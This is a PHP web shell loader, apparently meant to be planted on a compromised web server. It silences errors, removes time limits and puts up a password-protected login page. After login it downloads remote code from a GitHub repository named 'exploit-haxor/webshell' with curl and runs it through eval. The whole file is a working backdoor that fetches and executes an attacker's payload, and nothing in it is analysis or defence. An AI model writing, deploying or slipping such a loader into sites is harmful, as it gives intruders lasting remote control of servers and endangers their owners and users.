<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// are u challange me :v
$hashed_password = '$2y$10$wRzpdab6XFKM4xFOVfRrqOGtH14qt96eWnpEkGZc98Q2LAKBql7vK';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Author Boleh Masuk Heker Jangan Masuk 
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie Berhasil
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
} 
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/fa.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);?>
